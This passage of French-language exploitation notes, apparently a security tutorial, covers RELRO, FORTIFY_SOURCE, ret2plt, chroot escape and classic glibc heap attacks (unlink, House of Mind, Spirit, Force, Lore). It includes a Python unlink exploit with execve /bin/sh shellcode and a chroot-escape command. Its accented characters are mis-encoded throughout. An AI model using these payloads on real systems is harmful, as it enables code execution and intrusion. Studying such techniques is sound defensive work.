0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sans relro :
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Pour le binaire **sans relro**, nous pouvons voir que l'adresse d'entr√©e `got` pour `fgets` est `0x404018`. En regardant les mappings m√©moire, nous voyons qu'elle se situe entre `0x404000` et `0x405000`, avec les **permissions `rw`**, ce qui signifie que nous pouvons lire et √©crire dedans. Pour le binaire **avec relro**, nous voyons que l'adresse de la table `got` pour l'ex√©cution du binaire (pie est activ√© donc cette adresse changera) est `0x555555557fd0`. Dans le mapping m√©moire de ce binaire, elle se situe entre `0x0000555555557000` et `0x0000555555558000`, avec la permission m√©moire **`r`**, ce qui signifie que nous ne pouvons que lire depuis cette adresse.

Alors, quel est le **contournement**? Le contournement typique que j'utilise est simplement de ne pas √©crire dans les r√©gions m√©moire que relro rend en lecture seule, et de **trouver un autre moyen d'obtenir l'ex√©cution de code**.

Notez que pour que cela se produise, le binaire doit conna√Ætre avant l'ex√©cution les adresses des fonctions :

* Liaison paresseuse : L'adresse d'une fonction est recherch√©e la premi√®re fois que la fonction est appel√©e. Ainsi, la GOT doit avoir des permissions d'√©criture pendant l'ex√©cution.
* Liaison imm√©diate : Les adresses des fonctions sont r√©solues au d√©but de l'ex√©cution, puis des permissions en lecture seule sont donn√©es aux sections sensibles comme .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Pour v√©rifier si un programme utilise la liaison imm√©diate, vous pouvez faire :
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando le binaire est charg√© en m√©moire et qu'une fonction est appel√©e pour la premi√®re fois, il saute √† la PLT (Procedure Linkage Table), d'o√π il saute (jmp) √† la GOT et d√©couvre que cette entr√©e n'a pas √©t√© r√©solue (elle contient une adresse suivante de la PLT). Il invoque alors le Runtime Linker ou rtfd pour r√©soudre l'adresse et la sauvegarder dans la GOT.

Lorsqu'une fonction est appel√©e, la PLT est appel√©e, elle contient l'adresse de la GOT o√π l'adresse de la fonction est stock√©e, redirigeant ainsi le flux l√†-bas pour appeler la fonction. Cependant, si c'est la premi√®re fois que la fonction est appel√©e, ce qui se trouve dans la GOT est l'instruction suivante de la PLT, donc le flux suit le code de la PLT (rtfd) et d√©couvre l'adresse de la fonction, la sauvegarde dans la GOT et l'appelle.

Lorsqu'un binaire est charg√© en m√©moire, le compilateur lui a indiqu√© √† quel d√©calage il doit placer les donn√©es qui doivent √™tre charg√©es lors de l'ex√©cution du programme.

Lazy binding ‚Äî> L'adresse de la fonction est recherch√©e la premi√®re fois que ladite fonction est invoqu√©e, donc la GOT a des autorisations d'√©criture pour que lorsqu'elle est recherch√©e, elle soit sauvegard√©e l√†-bas et qu'il ne soit pas n√©cessaire de la rechercher √† nouveau.

Bind now ‚Äî> Les adresses des fonctions sont recherch√©es lors du chargement du programme et les autorisations des sections .got, .dtors, .ctors, .dynamic, .jcr sont modifi√©es en lecture seule. **-z relro** et **-z now**

Malgr√© cela, en g√©n√©ral, les programmes ne sont pas compliqu√©s avec ces options, donc ces attaques restent possibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> Pour savoir s'ils utilisent le BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 ou =2**

Il essaie d'identifier les fonctions qui copient d'un endroit √† un autre de mani√®re non s√©curis√©e et de remplacer la fonction par une fonction s√©curis√©e.

Par exemple :\
char buf\[16];\
strcpy(but, source);

Il l'identifie comme non s√©curis√© et remplace alors strcpy() par \_\_strcpy\_chk() en utilisant la taille du tampon comme taille maximale √† copier.

La diff√©rence entre **=1** ou **=2** est que :

Le second ne permet pas que **%n** provienne d'une section avec des autorisations d'√©criture. De plus, le param√®tre pour l'acc√®s direct aux arguments ne peut √™tre utilis√© que si les pr√©c√©dents ont √©t√© utilis√©s, c'est-√†-dire que **%3$d** ne peut √™tre utilis√© que si **%2$d** et **%1$d** ont √©t√© utilis√©s auparavant.

Pour afficher le message d'erreur, on utilise argv\[0\], donc si l'on met l'adresse d'un autre endroit (comme une variable globale) dedans, le message d'erreur affichera le contenu de ladite variable. Page 191

**Remplacement de Libsafe**

Il est activ√© avec : LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas standardis√©. (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√©curis√©es et LD\_PRELOAD ne fonctionne pas avec les binaires suid).

**Espace d'adressage ASCII blind√©**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela ne stoppe pratiquement aucune attaque, surtout en little endian.

**ret2plt**

Consiste √† r√©aliser un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction √† appeler (system()). Ensuite, on fait de m√™me en pointant vers GOT+1 et en copiant le 2√®me octet de system()... Enfin, on appelle l'adresse stock√©e dans la GOT qui sera system()

**Faux EBP**

Pour les fonctions qui utilisent l'EBP comme registre pour pointer vers les arguments en modifiant l'EIP et en pointant vers system(), l'EBP doit √©galement avoir √©t√© modifi√© pour pointer vers une zone m√©moire contenant 2 octets quelconques, puis l'adresse de &‚Äù/bin/sh‚Äù.

**Jails avec chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installe un syst√®me de base dans un sous-r√©pertoire sp√©cifique

Un administrateur peut sortir de l'une de ces prisons en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind ‚Äî> Recherche d'erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de la pile : Exploits de base**

**Chunk allou√©**

prev\_size |\
size | ‚ÄîEn-t√™te\
\*mem | Donn√©es

**Chunk libre**

prev\_size |\
size |\
\*fd | Ptr chunk suivant\
\*bk | Ptr chunk pr√©c√©dent ‚ÄîEn-t√™te\
\*mem | Donn√©es

Les chunks libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux chunks libres cons√©cutifs (ils sont fusionn√©s).

Dans "size", il y a des bits pour indiquer : si le chunk pr√©c√©dent est en cours d'utilisation, si le chunk a √©t√© allou√© via mmap() et si le chunk appartient √† l'arena principal.

Lorsqu'un chunk est lib√©r√© et que l'un des chunks adjacents est libre, ils sont fusionn√©s via la macro unlink() et le nouveau chunk le plus grand est pass√© √† frontlink() pour qu'il l'ins√®re dans le bon bin.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau chunk est celui qui √©tait libre avant\
FD = P->fd; ‚Äî> Le FD du nouveau chunk est celui qui √©tait libre avant\
FD->bk = BK; ‚Äî> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; ‚Äî> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Par cons√©quent, si nous parvenons √† modifier P->bk avec l'adresse d'un shellcode et P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, nous obtenons :

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ainsi, lorsque le programme se termine, le shellcode est ex√©cut√©.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre ajust√© pour cela :

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et atteindre des nops qui m√®nent au reste du shellcode.

Ainsi, l'exploit est cr√©√© :

Dans le buffer1, nous ins√©rons le shellcode en commen√ßant par un jmp pour qu'il atteigne les nops ou le reste du shellcode.

Apr√®s le shellcode, nous ins√©rons du rembourrage jusqu'√† atteindre le champ prev\_size et size du chunk suivant. √Ä ces endroits, nous ins√©rons 0xfffffff0 (pour √©craser prev\_size et indiquer qu'il est libre) et ‚Äú-4‚Äù (0xfffffffc) dans size (pour que lors de la v√©rification du 3√®me chunk si le 2√®me √©tait libre, il aille en r√©alit√© au prev\_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() est appel√©, il ira au size du 3√®me mais en r√©alit√© ira au 2√®me - 4 et pensera que le 2√®me chunk est libre. Il appellera alors **unlink()**.

Lors de l'appel √† unlink(), les premi√®res donn√©es du 2√®me chunk sont utilis√©es comme P->fd, donc l'adresse √† √©craser - 12 (car dans FD->bk, 12 est ajout√© √† l'adresse stock√©e dans FD) sera ins√©r√©e √† cet endroit. Et √† cette adresse, la deuxi√®me adresse du 2√®me chunk est ins√©r√©e, qui doit √™tre l'adresse du shellcode (faux P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Il est important que le bit indiquant que le chunk pr√©c√©dent est libre soit √† 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour que le "size" du 3√®me chunk soit d√©cal√© de 4 octets en arri√®re (pointe vers prev\_size) l√† o√π il v√©rifie si le 2√®me chunk est libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Dans la charge utile, nous ajoutons 8 octets de bourrage au d√©but**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (sera √©cras√©e pour ex√©cuter le shellcode la 2√®me fois que free est appel√©)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Comme mentionn√©, la charge utile commence par 8 octets de bourrage pour une raison quelconque**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Le 2√®me chunk est modifi√©, got\_free pointe vers o√π nous allons stocker l'adresse addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() lib√©rant dans l'ordre inverse (wargame)**

Nous contr√¥lons 3 chunks cons√©cutifs et les lib√©rons dans l'ordre inverse de la r√©servation.

Dans ce cas :

Nous pla√ßons le shellcode dans le chunk c

Nous utilisons le chunk a pour √©craser le b de mani√®re √† ce que le bit PREV\_INUSE du chunk a soit d√©sactiv√©, de sorte que le programme pense que le chunk a est libre.

De plus, nous √©crasons dans l'en-t√™te b la taille pour qu'elle soit -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, donc il appellera unlink() pour le d√©tacher. Cependant, comme l'en-t√™te PREV\_SIZE vaut -4, il pensera que le chunk "a" commence r√©ellement √† b+4. Autrement dit, il d√©tachera un chunk commen√ßant √† b+4, donc √† b+12 se trouvera le pointeur "fd" et √† b+16 se trouvera le pointeur "bk".

De cette mani√®re, si nous mettons l'adresse du shellcode dans bk et l'adresse de la fonction "puts()" -12 dans fd, nous avons notre charge utile.

**Technique de Frontlink**

Frontlink est appel√© lorsqu'un chunk est lib√©r√© et aucun de ses chunks adjacents n'est libre, unlink() n'est pas appel√© mais frontlink() l'est directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un tampon pouvant √™tre d√©bord√© avec la fonction de saisie de donn√©es

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de son en-t√™te sera modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent

Un tampon d√©clar√© avant l'√©tape 3 permettant de remplacer le prev\_size de celui-ci

En contr√¥lant ainsi deux mallocs de mani√®re incontr√¥l√©e et un de mani√®re contr√¥l√©e mais qui n'est lib√©r√© qu'une seule fois, nous pouvons exploiter une faille.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si l'on souhaite r√©utiliser l'un, cela se fera sans probl√®me. Si l'on souhaite utiliser l'autre, il se verra attribuer le m√™me espace, ce qui fausserait les pointeurs "fd" et "bk" avec les donn√©es √©crites par la r√©servation pr√©c√©dente.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Seule une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est int√©ressant de rechercher un deuxi√®me chunk qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() entra√Æne un appel √† public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur vers l'adresse o√π commence le chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

‚Ä¶

_int_free(ar_ptr, mem);

}

Dans \[1], il v√©rifie le champ size du bit NON_MAIN_ARENA, que l'on peut modifier pour que la v√©rification renvoie true et ex√©cute heap_for_ptr() qui effectue un and √† "mem" en mettant √† 0 les 2,5 octets les moins significatifs (dans notre cas, de 0x0804a000, il laisse 0x08000000) et acc√®de √† 0x08000000->ar_ptr (comme s'il s'agissait d'une structure heap_info)

De cette mani√®re, si nous pouvons contr√¥ler un chunk par exemple √† 0x0804a000 et qu'un chunk est lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me chunk est lib√©r√©, il trouvera que heap_for_ptr(ptr)->ar_ptr renvoie ce que nous avons √©crit √† 0x08100000 (car il applique l'and √† 0x081002a0 que nous avons vu pr√©c√©demment et en extrait la valeur des 4 premiers octets, ar_ptr)

Ainsi, _int_free(ar_ptr, mem) est appel√©, c'est-√†-dire, **_int_free(0x0804a000, 0x081002a0)**\
**_int_free(mstate av, Void_t* mem){**\
‚Ä¶\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le chunk qui va √™tre lib√©r√©.

Comme unsorted_chunks est d√©fini, nous savons que :\
bck = &av->bins[2]-8;\
fwd = bck->fd = *(av->bins[2]);\
fwd->bk = *(av->bins[2] + 12) = p;

Par cons√©quent, si nous √©crivons la valeur de __DTOR_END__-12 dans av->bins[2], √† la derni√®re instruction, l'adresse du deuxi√®me chunk sera √©crite dans __DTOR_END__.

Cela signifie qu'au d√©but du premier chunk, nous devons mettre plusieurs fois l'adresse de __DTOR_END__-12 car av->bins[2] la r√©cup√©rera de l√†.

√Ä l'adresse o√π tombe l'adresse du deuxi√®me chunk avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier chunk pour que heap_for_ptr() pense que ar_ptr est au d√©but du premier chunk et en extrait av->bins[2]

Dans le deuxi√®me chunk et gr√¢ce au premier, nous √©crasons prev_size avec un saut de 0x0c et size avec quelque chose pour activer -> NON_MAIN_ARENA

Ensuite, dans le deuxi√®me chunk, nous mettons beaucoup de nops et enfin le shellcode

Ainsi, _int_free(chunk1, chunk2) sera appel√© et suivra les instructions pour √©crire dans __DTOR_END__ l'adresse du prev_size du chunk2 qui sautera vers le shellcode.

Pour appliquer cette technique, certains autres pr√©requis doivent √™tre remplis, ce qui complique un peu plus la charge utile.
Cette technique n'est plus applicable car elle a √©t√© presque enti√®rement patch√©e comme pour unlink. On compare si le nouveau site pointe √©galement vers lui.

**Fastbin**

C'est une variante de The house of mind

Nous voulons ex√©cuter le code suivant apr√®s la premi√®re v√©rification de la fonction \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> O√π fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De cette mani√®re, si "fb" pointe vers une fonction dans la GOT, l'adresse du morceau √©cras√© sera plac√©e √† cette adresse. Pour cela, il est n√©cessaire que l'ar√®ne soit proche des adresses de dtors. Plus pr√©cis√©ment, av->max\_fast doit √™tre √† l'adresse que nous allons √©craser.

Puisque avec The House of Mind, nous avons vu que nous contr√¥lions la position de av.

Ainsi, si nous mettons une taille de 8 + NON\_MAIN\_ARENA + PREV\_INUSE dans le champ size, fastbin\_index() nous renverra fastbins\[-1\], qui pointera vers av->max\_fast

Dans ce cas, av->max\_fast sera l'adresse qui sera √©cras√©e (non celle vers laquelle elle pointe, mais cette position sera √©cras√©e).

De plus, le morceau contigu au morceau lib√©r√© doit √™tre plus grand que 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 8, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe dans des nops).

De plus, ce m√™me faux morceau doit √™tre plus petit que av->system\_mem. av->system\_mem est situ√© √† 1848 octets plus loin.

En raison des z√©ros de \_DTOR\_END\_ et des quelques adresses dans la GOT, aucune de ces adresses de ces sections ne convient pour √™tre √©cras√©e, donc voyons comment appliquer fastbin pour attaquer la pile.

Une autre forme d'attaque est de rediriger le **av** vers la pile.

Si nous modifions la taille pour qu'elle soit de 16 au lieu de 8 alors : fastbin\_index() nous renverra fastbins\[0\] et nous pouvons utiliser cela pour √©craser la pile.

Pour cela, il ne doit y avoir aucun canary ni de valeurs √©tranges dans la pile, en fait nous devons nous trouver dans cette configuration : 4 octets nuls + EBP + RET

Les 4 octets nuls sont n√©cessaires pour que le **av** soit √† cette adresse et le premier √©l√©ment d'un **av** est le mutex qui doit valoir 0.

Le **av->max\_fast** sera l'EBP et sera une valeur qui nous permettra de contourner les restrictions.

Dans le **av->fastbins\[0\]** sera √©cras√© avec l'adresse de **p** et sera le RET, ainsi il sautera √† la shellcode.

De plus, dans **av->system\_mem** (1484 octets au-dessus de la position dans la pile) il y aura suffisamment de d√©chets qui nous permettront de contourner la v√©rification effectu√©e.

De plus, le morceau contigu au morceau lib√©r√© doit √™tre plus grand que 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 16, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe dans des nops qui viennent apr√®s le champ size du nouveau faux morceau).

**The House of Spirit**

Dans ce cas, nous cherchons √† avoir un pointeur vers un malloc qui peut √™tre modifi√© par l'attaquant (par exemple, le pointeur est sur la pile sous un √©ventuel d√©bordement d'une variable).

Ainsi, nous pourrions faire pointer ce pointeur o√π nous voulons. Cependant, n'importe quel endroit n'est pas valide, la taille du faux morceau doit √™tre inf√©rieure √† av->max\_fast et plus sp√©cifiquement √©gale √† la taille demand√©e dans un futur appel √† malloc()+8. Par cons√©quent, si nous savons qu'apr√®s ce pointeur vuln√©rable, un malloc(40) est appel√©, la taille du faux morceau doit √™tre √©gale √† 48.

Par exemple, si le programme demande √† l'utilisateur un nombre, nous pourrions entrer 48 et pointer le pointeur de malloc modifiable vers les 4 octets suivants (qui pourraient appartenir √† l'EBP avec un peu de chance, ainsi le 48 reste derri√®re, comme s'il √©tait l'en-t√™te size). De plus, l'adresse ptr-4+48 doit remplir plusieurs conditions (dans ce cas ptr=EBP), c'est-√†-dire, 8 < ptr-4+48 < av->system\_mem.

Si cela est vrai, lorsque le prochain malloc est appel√©, qui √©tait malloc(40), l'adresse du EBP lui sera assign√©e. Si l'attaquant peut √©galement contr√¥ler ce qui est √©crit dans ce malloc, il peut √©craser √† la fois l'EBP et l'EIP avec l'adresse qu'il souhaite.

Cela est d√ª au fait que lorsque free() est appel√©, il enregistre que l'adresse point√©e par l'EBP de la pile contient un morceau de taille parfaite pour le nouveau malloc() √† r√©server, il lui assigne donc cette adresse.

**The House of Force**

Il est n√©cessaire de :

* Un d√©bordement sur un morceau qui permet de remplacer le wilderness
* Un appel √† malloc() avec la taille d√©finie par l'utilisateur
* Un appel √† malloc() dont les donn√©es peuvent √™tre d√©finies par l'utilisateur

La premi√®re chose √† faire est de remplacer la taille du morceau wilderness par une valeur tr√®s grande (0xffffffff), de sorte que toute demande de m√©moire suffisamment grande sera trait√©e dans \_int\_malloc() sans avoir besoin d'√©tendre le tas.

La deuxi√®me √©tape est de modifier av->top pour qu'il pointe vers une zone de m√©moire sous le contr√¥le de l'attaquant, comme la pile. Dans av->top, on met \&EIP - 8.

Nous devons remplacer av->top pour qu'il pointe vers la zone de m√©moire sous le contr√¥le de l'attaquant :

victime = av->top;

reste = chunck\_at\_offset(victime, nb);

av->top = reste;

La victime r√©cup√®re la valeur de l'adresse du morceau wilderness actuel (l'actuel av->top) et reste est exactement la somme de cette adresse plus la quantit√© d'octets demand√©e par malloc(). Ainsi, si \&EIP-8 est √† 0xbffff224 et av->top contient 0x080c2788, alors la quantit√© que nous devons r√©server dans le malloc contr√¥l√© pour que av->top pointe vers $EIP-8 pour le prochain malloc() sera :

0xbffff224 - 0x080c2788 = 3086207644.

Ainsi, la valeur modifi√©e sera enregistr√©e dans av->top et le prochain malloc pointera vers l'EIP et pourra l'√©craser.

Il est important de savoir que la taille du nouveau morceau wilderness soit plus grande que la demande faite par le dernier malloc(). Autrement dit, si le wilderness pointe vers \&EIP-8, la taille sera juste dans le champ EBP de la pile.

**The House of Lore**

**Corruption SmallBin**

Les morceaux lib√©r√©s sont plac√©s dans le bin en fonction de leur taille. Mais avant d'√™tre plac√©s, ils sont stock√©s dans des bacs non tri√©s. Lorsqu'un morceau est lib√©r√©, il n'est pas imm√©diatement plac√© dans son bin mais reste dans les bacs non tri√©s. Ensuite, s'il est demand√© un nouveau morceau et que le pr√©c√©dent lib√©r√© peut √™tre utilis√©, il est renvoy√©, mais s'il est demand√© un morceau plus grand, le morceau lib√©r√© dans les bacs non tri√©s est plac√© dans son bin appropri√©.

Pour atteindre le code vuln√©rable, la demande de m√©moire doit √™tre sup√©rieure √† av->max\_fast (72 normalement) et inf√©rieure √† MIN\_LARGE\_SIZE (512).

Si dans le bin il y a un morceau de la taille appropri√©e √† ce qui est demand√©, il est renvoy√© apr√®s avoir √©t√© d√©tach√© :

bck = victime->bk; Pointe vers le morceau pr√©c√©dent, c'est la seule information que nous pouvons modifier.

bin->bk = bck; Le deuxi√®me morceau devient le dernier, si bck pointe vers la pile, le prochain morceau r√©serv√© recevra cette adresse

bck->fd = bin; La liste est ferm√©e en faisant pointer celui-ci vers bin

Il est n√©cessaire :
R√©servez deux malloc, de sorte que le premier puisse √™tre d√©bord√© apr√®s que le second ait √©t√© lib√©r√© et plac√© dans son bin (c'est-√†-dire qu'un malloc plus grand que le deuxi√®me morceau ait √©t√© r√©serv√© avant le d√©bordement)

Le malloc r√©serv√© √† l'adresse choisie par l'attaquant doit √™tre contr√¥l√© par l'attaquant.

L'objectif est le suivant, si nous pouvons d√©border un tas qui a en dessous un morceau d√©j√† lib√©r√© et dans son bin, nous pouvons alt√©rer son pointeur bk. En modifiant le pointeur bk et si ce morceau devient le premier de la liste du bin et est r√©serv√©, le bin sera tromp√© et lui dira que le dernier morceau de la liste (le prochain √† offrir) est √† l'adresse fausse que nous avons sp√©cifi√©e (par exemple, le stack ou la GOT). Ainsi, si un autre morceau est r√©serv√© et que l'attaquant a des autorisations dessus, un morceau sera donn√© √† la position souhait√©e et pourra y √©crire.

Apr√®s avoir lib√©r√© le morceau modifi√©, il est n√©cessaire de r√©server un morceau plus grand que celui lib√©r√©, de sorte que le morceau modifi√© sorte des unsorted bins et soit introduit dans son bin.

Une fois dans son bin, il est temps de modifier le pointeur bk via le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin devra attendre que malloc() soit appel√© suffisamment de fois pour que le bin modifi√© soit r√©utilis√© et trompe le bin en lui faisant croire que le morceau suivant est √† l'adresse fausse. Ensuite, le morceau qui nous int√©resse sera donn√©.

Pour ex√©cuter la vuln√©rabilit√© le plus rapidement possible, l'id√©al serait : R√©server le morceau vuln√©rable, r√©server le morceau qui sera modifi√©, lib√©rer ce morceau, r√©server un morceau plus grand que celui qui sera modifi√©, modifier le morceau (vuln√©rabilit√©), r√©server un morceau de m√™me taille que celui viol√© et r√©server un deuxi√®me morceau de m√™me taille qui pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, la v√©rification typique que le morceau "n'est pas" faux est utilis√©e : on v√©rifie si bck->fd pointe vers la victime. C'est-√†-dire que dans notre cas, si le pointeur fd* du faux morceau point√© dans le stack pointe vers la victime. Pour contourner cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement via le stack) √† l'adresse appropri√©e l'adresse de la victime. Ainsi, cela ressemblera √† un morceau r√©el.

**Corruption LargeBin**

Les m√™mes exigences que pr√©c√©demment sont n√©cessaires et quelques autres, en plus les morceaux r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est similaire √† la pr√©c√©dente, c'est-√†-dire qu'il faut modifier le pointeur bk et toutes ces appels √† malloc(), mais en plus il faut modifier la taille du morceau modifi√© de telle sorte que cette taille - nb soit < MINSIZE.

Par exemple, il faudra mettre une taille de 1552 pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car elle compare un unsigned)

